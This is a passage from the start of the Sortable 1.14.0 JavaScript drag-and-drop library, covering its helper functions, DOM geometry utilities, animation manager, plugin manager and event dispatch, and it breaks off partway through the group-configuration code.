/**!
 * Sortable 1.14.0
 * @author	RubaXa   <trash@rubaxa.org>
 * @author	owenm    <owen23355@gmail.com>
 * @license MIT
 */
(function (global, factory) {
  typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
  typeof define === 'function' && define.amd ? define(factory) :
  (global = global || self, global.Sortable = factory());
}(this, (function () { 'use strict';

  function ownKeys(object, enumerableOnly) {
	var keys = Object.keys(object);

	if (Object.getOwnPropertySymbols) {
	  var symbols = Object.getOwnPropertySymbols(object);

	  if (enumerableOnly) {
		symbols = symbols.filter(function (sym) {
		  return Object.getOwnPropertyDescriptor(object, sym).enumerable;
		});
	  }

	  keys.push.apply(keys, symbols);
	}

	return keys;
  }

  function _objectSpread2(target) {
	for (var i = 1; i < arguments.length; i++) {
	  var source = arguments[i] != null ? arguments[i] : {};

	  if (i % 2) {
		ownKeys(Object(source), true).forEach(function (key) {
		  _defineProperty(target, key, source[key]);
		});
	  } else if (Object.getOwnPropertyDescriptors) {
		Object.defineProperties(target, Object.getOwnPropertyDescriptors(source));
	  } else {
		ownKeys(Object(source)).forEach(function (key) {
		  Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
		});
	  }
	}

	return target;
  }

  function _typeof(obj) {
	"@babel/helpers - typeof";

	if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") {
	  _typeof = function (obj) {
		return typeof obj;
	  };
	} else {
	  _typeof = function (obj) {
		return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
	  };
	}

	return _typeof(obj);
  }

  function _defineProperty(obj, key, value) {
	if (key in obj) {
	  Object.defineProperty(obj, key, {
		value: value,
		enumerable: true,
		configurable: true,
		writable: true
	  });
	} else {
	  obj[key] = value;
	}

	return obj;
  }

  function _extends() {
	_extends = Object.assign || function (target) {
	  for (var i = 1; i < arguments.length; i++) {
		var source = arguments[i];

		for (var key in source) {
		  if (Object.prototype.hasOwnProperty.call(source, key)) {
			target[key] = source[key];
		  }
		}
	  }

	  return target;
	};

	return _extends.apply(this, arguments);
  }

  function _objectWithoutPropertiesLoose(source, excluded) {
	if (source == null) return {};
	var target = {};
	var sourceKeys = Object.keys(source);
	var key, i;

	for (i = 0; i < sourceKeys.length; i++) {
	  key = sourceKeys[i];
	  if (excluded.indexOf(key) >= 0) continue;
	  target[key] = source[key];
	}

	return target;
  }

  function _objectWithoutProperties(source, excluded) {
	if (source == null) return {};

	var target = _objectWithoutPropertiesLoose(source, excluded);

	var key, i;

	if (Object.getOwnPropertySymbols) {
	  var sourceSymbolKeys = Object.getOwnPropertySymbols(source);

	  for (i = 0; i < sourceSymbolKeys.length; i++) {
		key = sourceSymbolKeys[i];
		if (excluded.indexOf(key) >= 0) continue;
		if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue;
		target[key] = source[key];
	  }
	}

	return target;
  }

  function _toConsumableArray(arr) {
	return _arrayWithoutHoles(arr) || _iterableToArray(arr) || _unsupportedIterableToArray(arr) || _nonIterableSpread();
  }

  function _arrayWithoutHoles(arr) {
	if (Array.isArray(arr)) return _arrayLikeToArray(arr);
  }

  function _iterableToArray(iter) {
	if (typeof Symbol !== "undefined" && iter[Symbol.iterator] != null || iter["@@iterator"] != null) return Array.from(iter);
  }

  function _unsupportedIterableToArray(o, minLen) {
	if (!o) return;
	if (typeof o === "string") return _arrayLikeToArray(o, minLen);
	var n = Object.prototype.toString.call(o).slice(8, -1);
	if (n === "Object" && o.constructor) n = o.constructor.name;
	if (n === "Map" || n === "Set") return Array.from(o);
	if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen);
  }

  function _arrayLikeToArray(arr, len) {
	if (len == null || len > arr.length) len = arr.length;

	for (var i = 0, arr2 = new Array(len); i < len; i++) arr2[i] = arr[i];

	return arr2;
  }

  function _nonIterableSpread() {
	throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
  }

  var version = "1.14.0";

  function userAgent(pattern) {
	if (typeof window !== 'undefined' && window.navigator) {
	  return !! /*@__PURE__*/navigator.userAgent.match(pattern);
	}
  }

  var IE11OrLess = userAgent(/(?:Trident.*rv[ :]?11\.|msie|iemobile|Windows Phone)/i);
  var Edge = userAgent(/Edge/i);
  var FireFox = userAgent(/firefox/i);
  var Safari = userAgent(/safari/i) && !userAgent(/chrome/i) && !userAgent(/android/i);
  var IOS = userAgent(/iP(ad|od|hone)/i);
  var ChromeForAndroid = userAgent(/chrome/i) && userAgent(/android/i);

  var captureMode = {
	capture: false,
	passive: false
  };

  function on(el, event, fn) {
	el.addEventListener(event, fn, !IE11OrLess && captureMode);
  }

  function off(el, event, fn) {
	el.removeEventListener(event, fn, !IE11OrLess && captureMode);
  }

  function matches(
  /**HTMLElement*/
  el,
  /**String*/
  selector) {
	if (!selector) return;
	selector[0] === '>' && (selector = selector.substring(1));

	if (el) {
	  try {
		if (el.matches) {
		  return el.matches(selector);
		} else if (el.msMatchesSelector) {
		  return el.msMatchesSelector(selector);
		} else if (el.webkitMatchesSelector) {
		  return el.webkitMatchesSelector(selector);
		}
	  } catch (_) {
		return false;
	  }
	}

	return false;
  }

  function getParentOrHost(el) {
	return el.host && el !== document && el.host.nodeType ? el.host : el.parentNode;
  }

  function closest(
  /**HTMLElement*/
  el,
  /**String*/
  selector,
  /**HTMLElement*/
  ctx, includeCTX) {
	if (el) {
	  ctx = ctx || document;

	  do {
		if (selector != null && (selector[0] === '>' ? el.parentNode === ctx && matches(el, selector) : matches(el, selector)) || includeCTX && el === ctx) {
		  return el;
		}

		if (el === ctx) break;
		/* jshint boss:true */
	  } while (el = getParentOrHost(el));
	}

	return null;
  }

  var R_SPACE = /\s+/g;

  function toggleClass(el, name, state) {
	if (el && name) {
	  if (el.classList) {
		el.classList[state ? 'add' : 'remove'](name);
	  } else {
		var className = (' ' + el.className + ' ').replace(R_SPACE, ' ').replace(' ' + name + ' ', ' ');
		el.className = (className + (state ? ' ' + name : '')).replace(R_SPACE, ' ');
	  }
	}
  }

  function css(el, prop, val) {
	var style = el && el.style;

	if (style) {
	  if (val === void 0) {
		if (document.defaultView && document.defaultView.getComputedStyle) {
		  val = document.defaultView.getComputedStyle(el, '');
		} else if (el.currentStyle) {
		  val = el.currentStyle;
		}

		return prop === void 0 ? val : val[prop];
	  } else {
		if (!(prop in style) && prop.indexOf('webkit') === -1) {
		  prop = '-webkit-' + prop;
		}

		style[prop] = val + (typeof val === 'string' ? '' : 'px');
	  }
	}
  }

  function matrix(el, selfOnly) {
	var appliedTransforms = '';

	if (typeof el === 'string') {
	  appliedTransforms = el;
	} else {
	  do {
		var transform = css(el, 'transform');

		if (transform && transform !== 'none') {
		  appliedTransforms = transform + ' ' + appliedTransforms;
		}
		/* jshint boss:true */

	  } while (!selfOnly && (el = el.parentNode));
	}

	var matrixFn = window.DOMMatrix || window.WebKitCSSMatrix || window.CSSMatrix || window.MSCSSMatrix;
	/*jshint -W056 */

	return matrixFn && new matrixFn(appliedTransforms);
  }

  function find(ctx, tagName, iterator) {
	if (ctx) {
	  var list = ctx.getElementsByTagName(tagName),
		  i = 0,
		  n = list.length;

	  if (iterator) {
		for (; i < n; i++) {
		  iterator(list[i], i);
		}
	  }

	  return list;
	}

	return [];
  }

  function getWindowScrollingElement() {
	var scrollingElement = document.scrollingElement;

	if (scrollingElement) {
	  return scrollingElement;
	} else {
	  return document.documentElement;
	}
  }
  /**
   * Returns the "bounding client rect" of given element
   * @param  {HTMLElement} el                       The element whose boundingClientRect is wanted
   * @param  {[Boolean]} relativeToContainingBlock  Whether the rect should be relative to the containing block of (including) the container
   * @param  {[Boolean]} relativeToNonStaticParent  Whether the rect should be relative to the relative parent of (including) the contaienr
   * @param  {[Boolean]} undoScale                  Whether the container's scale() should be undone
   * @param  {[HTMLElement]} container              The parent the element will be placed in
   * @return {Object}                               The boundingClientRect of el, with specified adjustments
   */


  function getRect(el, relativeToContainingBlock, relativeToNonStaticParent, undoScale, container) {
	if (!el.getBoundingClientRect && el !== window) return;
	var elRect, top, left, bottom, right, height, width;

	if (el !== window && el.parentNode && el !== getWindowScrollingElement()) {
	  elRect = el.getBoundingClientRect();
	  top = elRect.top;
	  left = elRect.left;
	  bottom = elRect.bottom;
	  right = elRect.right;
	  height = elRect.height;
	  width = elRect.width;
	} else {
	  top = 0;
	  left = 0;
	  bottom = window.innerHeight;
	  right = window.innerWidth;
	  height = window.innerHeight;
	  width = window.innerWidth;
	}

	if ((relativeToContainingBlock || relativeToNonStaticParent) && el !== window) {
	  // Adjust for translate()
	  container = container || el.parentNode; // solves #1123 (see: https://stackoverflow.com/a/37953806/6088312)
	  // Not needed on <= IE11

	  if (!IE11OrLess) {
		do {
		  if (container && container.getBoundingClientRect && (css(container, 'transform') !== 'none' || relativeToNonStaticParent && css(container, 'position') !== 'static')) {
			var containerRect = container.getBoundingClientRect(); // Set relative to edges of padding box of container

			top -= containerRect.top + parseInt(css(container, 'border-top-width'));
			left -= containerRect.left + parseInt(css(container, 'border-left-width'));
			bottom = top + elRect.height;
			right = left + elRect.width;
			break;
		  }
		  /* jshint boss:true */

		} while (container = container.parentNode);
	  }
	}

	if (undoScale && el !== window) {
	  // Adjust for scale()
	  var elMatrix = matrix(container || el),
		  scaleX = elMatrix && elMatrix.a,
		  scaleY = elMatrix && elMatrix.d;

	  if (elMatrix) {
		top /= scaleY;
		left /= scaleX;
		width /= scaleX;
		height /= scaleY;
		bottom = top + height;
		right = left + width;
	  }
	}

	return {
	  top: top,
	  left: left,
	  bottom: bottom,
	  right: right,
	  width: width,
	  height: height
	};
  }
  /**
   * Checks if a side of an element is scrolled past a side of its parents
   * @param  {HTMLElement}  el           The element who's side being scrolled out of view is in question
   * @param  {String}       elSide       Side of the element in question ('top', 'left', 'right', 'bottom')
   * @param  {String}       parentSide   Side of the parent in question ('top', 'left', 'right', 'bottom')
   * @return {HTMLElement}               The parent scroll element that the el's side is scrolled past, or null if there is no such element
   */


  function isScrolledPast(el, elSide, parentSide) {
	var parent = getParentAutoScrollElement(el, true),
		elSideVal = getRect(el)[elSide];
	/* jshint boss:true */

	while (parent) {
	  var parentSideVal = getRect(parent)[parentSide],
		  visible = void 0;

	  if (parentSide === 'top' || parentSide === 'left') {
		visible = elSideVal >= parentSideVal;
	  } else {
		visible = elSideVal <= parentSideVal;
	  }

	  if (!visible) return parent;
	  if (parent === getWindowScrollingElement()) break;
	  parent = getParentAutoScrollElement(parent, false);
	}

	return false;
  }
  /**
   * Gets nth child of el, ignoring hidden children, sortable's elements (does not ignore clone if it's visible)
   * and non-draggable elements
   * @param  {HTMLElement} el       The parent element
   * @param  {Number} childNum      The index of the child
   * @param  {Object} options       Parent Sortable's options
   * @return {HTMLElement}          The child at index childNum, or null if not found
   */


  function getChild(el, childNum, options, includeDragEl) {
	var currentChild = 0,
		i = 0,
		children = el.children;

	while (i < children.length) {
	  if (children[i].style.display !== 'none' && children[i] !== Sortable.ghost && (includeDragEl || children[i] !== Sortable.dragged) && closest(children[i], options.draggable, el, false)) {
		if (currentChild === childNum) {
		  return children[i];
		}

		currentChild++;
	  }

	  i++;
	}

	return null;
  }
  /**
   * Gets the last child in the el, ignoring ghostEl or invisible elements (clones)
   * @param  {HTMLElement} el       Parent element
   * @param  {selector} selector    Any other elements that should be ignored
   * @return {HTMLElement}          The last child, ignoring ghostEl
   */


  function lastChild(el, selector) {
	var last = el.lastElementChild;

	while (last && (last === Sortable.ghost || css(last, 'display') === 'none' || selector && !matches(last, selector))) {
	  last = last.previousElementSibling;
	}

	return last || null;
  }
  /**
   * Returns the index of an element within its parent for a selected set of
   * elements
   * @param  {HTMLElement} el
   * @param  {selector} selector
   * @return {number}
   */


  function index(el, selector) {
	var index = 0;

	if (!el || !el.parentNode) {
	  return -1;
	}
	/* jshint boss:true */


	while (el = el.previousElementSibling) {
	  if (el.nodeName.toUpperCase() !== 'TEMPLATE' && el !== Sortable.clone && (!selector || matches(el, selector))) {
		index++;
	  }
	}

	return index;
  }
  /**
   * Returns the scroll offset of the given element, added with all the scroll offsets of parent elements.
   * The value is returned in real pixels.
   * @param  {HTMLElement} el
   * @return {Array}             Offsets in the format of [left, top]
   */


  function getRelativeScrollOffset(el) {
	var offsetLeft = 0,
		offsetTop = 0,
		winScroller = getWindowScrollingElement();

	if (el) {
	  do {
		var elMatrix = matrix(el),
			scaleX = elMatrix.a,
			scaleY = elMatrix.d;
		offsetLeft += el.scrollLeft * scaleX;
		offsetTop += el.scrollTop * scaleY;
	  } while (el !== winScroller && (el = el.parentNode));
	}

	return [offsetLeft, offsetTop];
  }
  /**
   * Returns the index of the object within the given array
   * @param  {Array} arr   Array that may or may not hold the object
   * @param  {Object} obj  An object that has a key-value pair unique to and identical to a key-value pair in the object you want to find
   * @return {Number}      The index of the object in the array, or -1
   */


  function indexOfObject(arr, obj) {
	for (var i in arr) {
	  if (!arr.hasOwnProperty(i)) continue;

	  for (var key in obj) {
		if (obj.hasOwnProperty(key) && obj[key] === arr[i][key]) return Number(i);
	  }
	}

	return -1;
  }

  function getParentAutoScrollElement(el, includeSelf) {
	// skip to window
	if (!el || !el.getBoundingClientRect) return getWindowScrollingElement();
	var elem = el;
	var gotSelf = false;

	do {
	  // we don't need to get elem css if it isn't even overflowing in the first place (performance)
	  if (elem.clientWidth < elem.scrollWidth || elem.clientHeight < elem.scrollHeight) {
		var elemCSS = css(elem);

		if (elem.clientWidth < elem.scrollWidth && (elemCSS.overflowX == 'auto' || elemCSS.overflowX == 'scroll') || elem.clientHeight < elem.scrollHeight && (elemCSS.overflowY == 'auto' || elemCSS.overflowY == 'scroll')) {
		  if (!elem.getBoundingClientRect || elem === document.body) return getWindowScrollingElement();
		  if (gotSelf || includeSelf) return elem;
		  gotSelf = true;
		}
	  }
	  /* jshint boss:true */

	} while (elem = elem.parentNode);

	return getWindowScrollingElement();
  }

  function extend(dst, src) {
	if (dst && src) {
	  for (var key in src) {
		if (src.hasOwnProperty(key)) {
		  dst[key] = src[key];
		}
	  }
	}

	return dst;
  }

  function isRectEqual(rect1, rect2) {
	return Math.round(rect1.top) === Math.round(rect2.top) && Math.round(rect1.left) === Math.round(rect2.left) && Math.round(rect1.height) === Math.round(rect2.height) && Math.round(rect1.width) === Math.round(rect2.width);
  }

  var _throttleTimeout;

  function throttle(callback, ms) {
	return function () {
	  if (!_throttleTimeout) {
		var args = arguments,
			_this = this;

		if (args.length === 1) {
		  callback.call(_this, args[0]);
		} else {
		  callback.apply(_this, args);
		}

		_throttleTimeout = setTimeout(function () {
		  _throttleTimeout = void 0;
		}, ms);
	  }
	};
  }

  function cancelThrottle() {
	clearTimeout(_throttleTimeout);
	_throttleTimeout = void 0;
  }

  function scrollBy(el, x, y) {
	el.scrollLeft += x;
	el.scrollTop += y;
  }

  function clone(el) {
	var Polymer = window.Polymer;
	var $ = window.jQuery || window.Zepto;

	if (Polymer && Polymer.dom) {
	  return Polymer.dom(el).cloneNode(true);
	} else if ($) {
	  return $(el).clone(true)[0];
	} else {
	  return el.cloneNode(true);
	}
  }

  function setRect(el, rect) {
	css(el, 'position', 'absolute');
	css(el, 'top', rect.top);
	css(el, 'left', rect.left);
	css(el, 'width', rect.width);
	css(el, 'height', rect.height);
  }

  function unsetRect(el) {
	css(el, 'position', '');
	css(el, 'top', '');
	css(el, 'left', '');
	css(el, 'width', '');
	css(el, 'height', '');
  }

  var expando = 'Sortable' + new Date().getTime();

  function AnimationStateManager() {
	var animationStates = [],
		animationCallbackId;
	return {
	  captureAnimationState: function captureAnimationState() {
		animationStates = [];
		if (!this.options.animation) return;
		var children = [].slice.call(this.el.children);
		children.forEach(function (child) {
		  if (css(child, 'display') === 'none' || child === Sortable.ghost) return;
		  animationStates.push({
			target: child,
			rect: getRect(child)
		  });

		  var fromRect = _objectSpread2({}, animationStates[animationStates.length - 1].rect); // If animating: compensate for current animation


		  if (child.thisAnimationDuration) {
			var childMatrix = matrix(child, true);

			if (childMatrix) {
			  fromRect.top -= childMatrix.f;
			  fromRect.left -= childMatrix.e;
			}
		  }

		  child.fromRect = fromRect;
		});
	  },
	  addAnimationState: function addAnimationState(state) {
		animationStates.push(state);
	  },
	  removeAnimationState: function removeAnimationState(target) {
		animationStates.splice(indexOfObject(animationStates, {
		  target: target
		}), 1);
	  },
	  animateAll: function animateAll(callback) {
		var _this = this;

		if (!this.options.animation) {
		  clearTimeout(animationCallbackId);
		  if (typeof callback === 'function') callback();
		  return;
		}

		var animating = false,
			animationTime = 0;
		animationStates.forEach(function (state) {
		  var time = 0,
			  target = state.target,
			  fromRect = target.fromRect,
			  toRect = getRect(target),
			  prevFromRect = target.prevFromRect,
			  prevToRect = target.prevToRect,
			  animatingRect = state.rect,
			  targetMatrix = matrix(target, true);

		  if (targetMatrix) {
			// Compensate for current animation
			toRect.top -= targetMatrix.f;
			toRect.left -= targetMatrix.e;
		  }

		  target.toRect = toRect;

		  if (target.thisAnimationDuration) {
			// Could also check if animatingRect is between fromRect and toRect
			if (isRectEqual(prevFromRect, toRect) && !isRectEqual(fromRect, toRect) && // Make sure animatingRect is on line between toRect & fromRect
			(animatingRect.top - toRect.top) / (animatingRect.left - toRect.left) === (fromRect.top - toRect.top) / (fromRect.left - toRect.left)) {
			  // If returning to same place as started from animation and on same axis
			  time = calculateRealTime(animatingRect, prevFromRect, prevToRect, _this.options);
			}
		  } // if fromRect != toRect: animate


		  if (!isRectEqual(toRect, fromRect)) {
			target.prevFromRect = fromRect;
			target.prevToRect = toRect;

			if (!time) {
			  time = _this.options.animation;
			}

			_this.animate(target, animatingRect, toRect, time);
		  }

		  if (time) {
			animating = true;
			animationTime = Math.max(animationTime, time);
			clearTimeout(target.animationResetTimer);
			target.animationResetTimer = setTimeout(function () {
			  target.animationTime = 0;
			  target.prevFromRect = null;
			  target.fromRect = null;
			  target.prevToRect = null;
			  target.thisAnimationDuration = null;
			}, time);
			target.thisAnimationDuration = time;
		  }
		});
		clearTimeout(animationCallbackId);

		if (!animating) {
		  if (typeof callback === 'function') callback();
		} else {
		  animationCallbackId = setTimeout(function () {
			if (typeof callback === 'function') callback();
		  }, animationTime);
		}

		animationStates = [];
	  },
	  animate: function animate(target, currentRect, toRect, duration) {
		if (duration) {
		  css(target, 'transition', '');
		  css(target, 'transform', '');
		  var elMatrix = matrix(this.el),
			  scaleX = elMatrix && elMatrix.a,
			  scaleY = elMatrix && elMatrix.d,
			  translateX = (currentRect.left - toRect.left) / (scaleX || 1),
			  translateY = (currentRect.top - toRect.top) / (scaleY || 1);
		  target.animatingX = !!translateX;
		  target.animatingY = !!translateY;
		  css(target, 'transform', 'translate3d(' + translateX + 'px,' + translateY + 'px,0)');
		  this.forRepaintDummy = repaint(target); // repaint

		  css(target, 'transition', 'transform ' + duration + 'ms' + (this.options.easing ? ' ' + this.options.easing : ''));
		  css(target, 'transform', 'translate3d(0,0,0)');
		  typeof target.animated === 'number' && clearTimeout(target.animated);
		  target.animated = setTimeout(function () {
			css(target, 'transition', '');
			css(target, 'transform', '');
			target.animated = false;
			target.animatingX = false;
			target.animatingY = false;
		  }, duration);
		}
	  }
	};
  }

  function repaint(target) {
	return target.offsetWidth;
  }

  function calculateRealTime(animatingRect, fromRect, toRect, options) {
	return Math.sqrt(Math.pow(fromRect.top - animatingRect.top, 2) + Math.pow(fromRect.left - animatingRect.left, 2)) / Math.sqrt(Math.pow(fromRect.top - toRect.top, 2) + Math.pow(fromRect.left - toRect.left, 2)) * options.animation;
  }

  var plugins = [];
  var defaults = {
	initializeByDefault: true
  };
  var PluginManager = {
	mount: function mount(plugin) {
	  // Set default static properties
	  for (var option in defaults) {
		if (defaults.hasOwnProperty(option) && !(option in plugin)) {
		  plugin[option] = defaults[option];
		}
	  }

	  plugins.forEach(function (p) {
		if (p.pluginName === plugin.pluginName) {
		  throw "Sortable: Cannot mount plugin ".concat(plugin.pluginName, " more than once");
		}
	  });
	  plugins.push(plugin);
	},
	pluginEvent: function pluginEvent(eventName, sortable, evt) {
	  var _this = this;

	  this.eventCanceled = false;

	  evt.cancel = function () {
		_this.eventCanceled = true;
	  };

	  var eventNameGlobal = eventName + 'Global';
	  plugins.forEach(function (plugin) {
		if (!sortable[plugin.pluginName]) return; // Fire global events if it exists in this sortable

		if (sortable[plugin.pluginName][eventNameGlobal]) {
		  sortable[plugin.pluginName][eventNameGlobal](_objectSpread2({
			sortable: sortable
		  }, evt));
		} // Only fire plugin event if plugin is enabled in this sortable,
		// and plugin has event defined


		if (sortable.options[plugin.pluginName] && sortable[plugin.pluginName][eventName]) {
		  sortable[plugin.pluginName][eventName](_objectSpread2({
			sortable: sortable
		  }, evt));
		}
	  });
	},
	initializePlugins: function initializePlugins(sortable, el, defaults, options) {
	  plugins.forEach(function (plugin) {
		var pluginName = plugin.pluginName;
		if (!sortable.options[pluginName] && !plugin.initializeByDefault) return;
		var initialized = new plugin(sortable, el, sortable.options);
		initialized.sortable = sortable;
		initialized.options = sortable.options;
		sortable[pluginName] = initialized; // Add default options from plugin

		_extends(defaults, initialized.defaults);
	  });

	  for (var option in sortable.options) {
		if (!sortable.options.hasOwnProperty(option)) continue;
		var modified = this.modifyOption(sortable, option, sortable.options[option]);

		if (typeof modified !== 'undefined') {
		  sortable.options[option] = modified;
		}
	  }
	},
	getEventProperties: function getEventProperties(name, sortable) {
	  var eventProperties = {};
	  plugins.forEach(function (plugin) {
		if (typeof plugin.eventProperties !== 'function') return;

		_extends(eventProperties, plugin.eventProperties.call(sortable[plugin.pluginName], name));
	  });
	  return eventProperties;
	},
	modifyOption: function modifyOption(sortable, name, value) {
	  var modifiedValue;
	  plugins.forEach(function (plugin) {
		// Plugin must exist on the Sortable
		if (!sortable[plugin.pluginName]) return; // If static option listener exists for this option, call in the context of the Sortable's instance of this plugin

		if (plugin.optionListeners && typeof plugin.optionListeners[name] === 'function') {
		  modifiedValue = plugin.optionListeners[name].call(sortable[plugin.pluginName], value);
		}
	  });
	  return modifiedValue;
	}
  };

  function dispatchEvent(_ref) {
	var sortable = _ref.sortable,
		rootEl = _ref.rootEl,
		name = _ref.name,
		targetEl = _ref.targetEl,
		cloneEl = _ref.cloneEl,
		toEl = _ref.toEl,
		fromEl = _ref.fromEl,
		oldIndex = _ref.oldIndex,
		newIndex = _ref.newIndex,
		oldDraggableIndex = _ref.oldDraggableIndex,
		newDraggableIndex = _ref.newDraggableIndex,
		originalEvent = _ref.originalEvent,
		putSortable = _ref.putSortable,
		extraEventProperties = _ref.extraEventProperties;
	sortable = sortable || rootEl && rootEl[expando];
	if (!sortable) return;
	var evt,
		options = sortable.options,
		onName = 'on' + name.charAt(0).toUpperCase() + name.substr(1); // Support for new CustomEvent feature

	if (window.CustomEvent && !IE11OrLess && !Edge) {
	  evt = new CustomEvent(name, {
		bubbles: true,
		cancelable: true
	  });
	} else {
	  evt = document.createEvent('Event');
	  evt.initEvent(name, true, true);
	}

	evt.to = toEl || rootEl;
	evt.from = fromEl || rootEl;
	evt.item = targetEl || rootEl;
	evt.clone = cloneEl;
	evt.oldIndex = oldIndex;
	evt.newIndex = newIndex;
	evt.oldDraggableIndex = oldDraggableIndex;
	evt.newDraggableIndex = newDraggableIndex;
	evt.originalEvent = originalEvent;
	evt.pullMode = putSortable ? putSortable.lastPutMode : undefined;

	var allEventProperties = _objectSpread2(_objectSpread2({}, extraEventProperties), PluginManager.getEventProperties(name, sortable));

	for (var option in allEventProperties) {
	  evt[option] = allEventProperties[option];
	}

	if (rootEl) {
	  rootEl.dispatchEvent(evt);
	}

	if (options[onName]) {
	  options[onName].call(sortable, evt);
	}
  }

  var _excluded = ["evt"];

  var pluginEvent = function pluginEvent(eventName, sortable) {
	var _ref = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {},
		originalEvent = _ref.evt,
		data = _objectWithoutProperties(_ref, _excluded);

	PluginManager.pluginEvent.bind(Sortable)(eventName, sortable, _objectSpread2({
	  dragEl: dragEl,
	  parentEl: parentEl,
	  ghostEl: ghostEl,
	  rootEl: rootEl,
	  nextEl: nextEl,
	  lastDownEl: lastDownEl,
	  cloneEl: cloneEl,
	  cloneHidden: cloneHidden,
	  dragStarted: moved,
	  putSortable: putSortable,
	  activeSortable: Sortable.active,
	  originalEvent: originalEvent,
	  oldIndex: oldIndex,
	  oldDraggableIndex: oldDraggableIndex,
	  newIndex: newIndex,
	  newDraggableIndex: newDraggableIndex,
	  hideGhostForTarget: _hideGhostForTarget,
	  unhideGhostForTarget: _unhideGhostForTarget,
	  cloneNowHidden: function cloneNowHidden() {
		cloneHidden = true;
	  },
	  cloneNowShown: function cloneNowShown() {
		cloneHidden = false;
	  },
	  dispatchSortableEvent: function dispatchSortableEvent(name) {
		_dispatchEvent({
		  sortable: sortable,
		  name: name,
		  originalEvent: originalEvent
		});
	  }
	}, data));
  };

  function _dispatchEvent(info) {
	dispatchEvent(_objectSpread2({
	  putSortable: putSortable,
	  cloneEl: cloneEl,
	  targetEl: dragEl,
	  rootEl: rootEl,
	  oldIndex: oldIndex,
	  oldDraggableIndex: oldDraggableIndex,
	  newIndex: newIndex,
	  newDraggableIndex: newDraggableIndex
	}, info));
  }

  var dragEl,
	  parentEl,
	  ghostEl,
	  rootEl,
	  nextEl,
	  lastDownEl,
	  cloneEl,
	  cloneHidden,
	  oldIndex,
	  newIndex,
	  oldDraggableIndex,
	  newDraggableIndex,
	  activeGroup,
	  putSortable,
	  awaitingDragStarted = false,
	  ignoreNextClick = false,
	  sortables = [],
	  tapEvt,
	  touchEvt,
	  lastDx,
	  lastDy,
	  tapDistanceLeft,
	  tapDistanceTop,
	  moved,
	  lastTarget,
	  lastDirection,
	  pastFirstInvertThresh = false,
	  isCircumstantialInvert = false,
	  targetMoveDistance,
	  // For positioning ghost absolutely
  ghostRelativeParent,
	  ghostRelativeParentInitialScroll = [],
	  // (left, top)
  _silent = false,
	  savedInputChecked = [];
  /** @const */

  var documentExists = typeof document !== 'undefined',
	  PositionGhostAbsolutely = IOS,
	  CSSFloatProperty = Edge || IE11OrLess ? 'cssFloat' : 'float',
	  // This will not pass for IE9, because IE9 DnD only works on anchors
  supportDraggable = documentExists && !ChromeForAndroid && !IOS && 'draggable' in document.createElement('div'),
	  supportCssPointerEvents = function () {
	if (!documentExists) return; // false when <= IE11

	if (IE11OrLess) {
	  return false;
	}

	var el = document.createElement('x');
	el.style.cssText = 'pointer-events:auto';
	return el.style.pointerEvents === 'auto';
  }(),
	  _detectDirection = function _detectDirection(el, options) {
	var elCSS = css(el),
		elWidth = parseInt(elCSS.width) - parseInt(elCSS.paddingLeft) - parseInt(elCSS.paddingRight) - parseInt(elCSS.borderLeftWidth) - parseInt(elCSS.borderRightWidth),
		child1 = getChild(el, 0, options),
		child2 = getChild(el, 1, options),
		firstChildCSS = child1 && css(child1),
		secondChildCSS = child2 && css(child2),
		firstChildWidth = firstChildCSS && parseInt(firstChildCSS.marginLeft) + parseInt(firstChildCSS.marginRight) + getRect(child1).width,
		secondChildWidth = secondChildCSS && parseInt(secondChildCSS.marginLeft) + parseInt(secondChildCSS.marginRight) + getRect(child2).width;

	if (elCSS.display === 'flex') {
	  return elCSS.flexDirection === 'column' || elCSS.flexDirection === 'column-reverse' ? 'vertical' : 'horizontal';
	}

	if (elCSS.display === 'grid') {
	  return elCSS.gridTemplateColumns.split(' ').length <= 1 ? 'vertical' : 'horizontal';
	}

	if (child1 && firstChildCSS["float"] && firstChildCSS["float"] !== 'none') {
	  var touchingSideChild2 = firstChildCSS["float"] === 'left' ? 'left' : 'right';
	  return child2 && (secondChildCSS.clear === 'both' || secondChildCSS.clear === touchingSideChild2) ? 'vertical' : 'horizontal';
	}

	return child1 && (firstChildCSS.display === 'block' || firstChildCSS.display === 'flex' || firstChildCSS.display === 'table' || firstChildCSS.display === 'grid' || firstChildWidth >= elWidth && elCSS[CSSFloatProperty] === 'none' || child2 && elCSS[CSSFloatProperty] === 'none' && firstChildWidth + secondChildWidth > elWidth) ? 'vertical' : 'horizontal';
  },
	  _dragElInRowColumn = function _dragElInRowColumn(dragRect, targetRect, vertical) {
	var dragElS1Opp = vertical ? dragRect.left : dragRect.top,
		dragElS2Opp = vertical ? dragRect.right : dragRect.bottom,
		dragElOppLength = vertical ? dragRect.width : dragRect.height,
		targetS1Opp = vertical ? targetRect.left : targetRect.top,
		targetS2Opp = vertical ? targetRect.right : targetRect.bottom,
		targetOppLength = vertical ? targetRect.width : targetRect.height;
	return dragElS1Opp === targetS1Opp || dragElS2Opp === targetS2Opp || dragElS1Opp + dragElOppLength / 2 === targetS1Opp + targetOppLength / 2;
  },

  /**
   * Detects first nearest empty sortable to X and Y position using emptyInsertThreshold.
   * @param  {Number} x      X position
   * @param  {Number} y      Y position
   * @return {HTMLElement}   Element of the first found nearest Sortable
   */
  _detectNearestEmptySortable = function _detectNearestEmptySortable(x, y) {
	var ret;
	sortables.some(function (sortable) {
	  var threshold = sortable[expando].options.emptyInsertThreshold;
	  if (!threshold || lastChild(sortable)) return;
	  var rect = getRect(sortable),
		  insideHorizontally = x >= rect.left - threshold && x <= rect.right + threshold,
		  insideVertically = y >= rect.top - threshold && y <= rect.bottom + threshold;

	  if (insideHorizontally && insideVertically) {
		return ret = sortable;
	  }
	});
	return ret;
  },
	  _prepareGroup = function _prepareGroup(options) {
	function toFn(value, pull) {
	  return function (to, from, dragEl, evt) {
		var sameGroup = to.options.group.name && from.options.group.name && to.options.group.name === from.options.group.name;

		if (value == null && (pull || sameGroup)) {
		  // Default pull value
		  // Default pull and put value if same group
		  return true;
		} else if (value == null || value === false) {
		  return false;
		} else if (pull && value === 'clone') {
		  return value;
